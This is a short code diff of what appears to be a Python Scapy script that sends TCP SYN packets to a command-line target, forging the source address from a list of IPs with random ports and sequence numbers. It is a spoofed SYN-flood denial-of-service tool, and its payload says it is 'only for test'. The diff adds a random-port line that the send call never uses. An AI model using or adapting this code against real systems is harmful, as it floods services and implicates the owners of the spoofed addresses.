@@ -27,8 +27,9 @@ for port in file1:
 target = str(sys.argv[2])
 
 number_packet = 0
-   
+
 for ip in IPs:
+    choose_open_port = [random.choice(open_port)]
     Port_src = random.randrange(1,65534)
     sequence = random.randrange(1,300000)
     send(IP(src=ip,dst=target)/TCP(sport=Port_src,dport=open_port,flags="S",seq=sequence)/"Hello World this Tools is Only for Test your Service on Internet dont use for Dangerous Purpose")
